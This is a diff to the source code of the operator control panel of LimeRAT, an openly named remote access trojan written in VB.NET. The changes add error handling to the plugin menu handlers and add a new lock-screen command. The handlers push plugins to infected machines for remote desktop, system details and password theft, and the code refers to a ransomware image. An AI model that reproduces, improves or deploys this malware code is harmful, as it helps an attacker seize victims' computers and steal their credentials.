@@ -1,5 +1,5 @@
 ﻿'##################################################################
-'##        N Y A N   C A T  |||   Updated on May./16/2018        ##
+'##        N Y A N   C A T  |||   Updated on July/31/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -18,7 +18,7 @@
 '##            ░░░░░░████▀░░███▀░░░░░░▀███░░▀██▀░░░░░░           ##
 '##            ░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░           ##
 '##                                                              ##
-'##                    .. LimeRAT v0.1.1 ..                      ##
+'##                           .. LimeRAT ..                      ##
 '##                                                              ##
 '##                                                              ##
 '##                                                              ##
@@ -992,12 +992,17 @@ Public Class Main
 #Region "Plugins"
 
     Private Sub RemoteDesktopToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RemoteDesktopToolStripMenuItem.Click
-        For Each x As ListViewItem In L1.SelectedItems
-            Dim _RDP As Remote_Desktop = My.Application.OpenForms("!" + x.SubItems(ID.Index).Text)
-            If _RDP Is Nothing Then
-                S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\RDP.dll")))
-            End If
-        Next
+        Try
+            For Each x As ListViewItem In L1.SelectedItems
+                Dim _RDP As Remote_Desktop = My.Application.OpenForms("!" + x.SubItems(ID.Index).Text)
+                If _RDP Is Nothing Then
+                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\RDP.dll")))
+                End If
+            Next
+        Catch ex As Exception
+            MsgBox(ex.Message, MsgBoxStyle.Critical)
+            Exit Sub
+        End Try
     End Sub
 
     Public Shared RANS_IMG
@@ -1024,7 +1029,8 @@ Public Class Main
                 Next
             End If
         Catch ex As Exception
-            MsgBox(ex.Message)
+            MsgBox(ex.Message, MsgBoxStyle.Critical)
+            Exit Sub
         End Try
     End Sub
 
@@ -1045,7 +1051,8 @@ Public Class Main
                 End If
             Next
         Catch ex As Exception
-            MsgBox(ex.Message)
+            MsgBox(ex.Message, MsgBoxStyle.Critical)
+            Exit Sub
         End Try
     End Sub
 
@@ -1058,23 +1065,45 @@ Public Class Main
                 End If
             Next
         Catch ex As Exception
-            MsgBox(ex.Message)
+            MsgBox(ex.Message, MsgBoxStyle.Critical)
+            Exit Sub
         End Try
     End Sub
 
     Private Sub DetailsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles DetailsToolStripMenuItem.Click
-        For Each x As ListViewItem In L1.SelectedItems
-            Dim n As System_Manager = My.Application.OpenForms("Info" + x.SubItems(ID.Index).Text)
-            If n Is Nothing Then
-                S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DET.dll")))
-            End If
-        Next
+        Try
+            For Each x As ListViewItem In L1.SelectedItems
+                Dim n As System_Manager = My.Application.OpenForms("Info" + x.SubItems(ID.Index).Text)
+                If n Is Nothing Then
+                    S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\DET.dll")))
+                End If
+            Next
+        Catch ex As Exception
+            MsgBox(ex.Message, MsgBoxStyle.Critical)
+            Exit Sub
+        End Try
+    End Sub
+
+    Private Sub LockScreenToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles LockScreenToolStripMenuItem.Click
+        Try
+            For Each x As ListViewItem In L1.SelectedItems
+                S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\LOC.dll")))
+            Next
+        Catch ex As Exception
+            MsgBox(ex.Message, MsgBoxStyle.Critical)
+            Exit Sub
+        End Try
     End Sub
 
     Private Sub PasswordsToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PasswordsToolStripMenuItem.Click
-        For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PWD.dll")))
-        Next
+        Try
+            For Each x As ListViewItem In L1.SelectedItems
+                S.Send(x.Tag, "CPL" + SPL + getMD5Hash(IO.File.ReadAllBytes(Application.StartupPath & "\Misc\Plugins\PWD.dll")))
+            Next
+        Catch ex As Exception
+            MsgBox(ex.Message, MsgBoxStyle.Critical)
+            Exit Sub
+        End Try
     End Sub
 
 #End Region
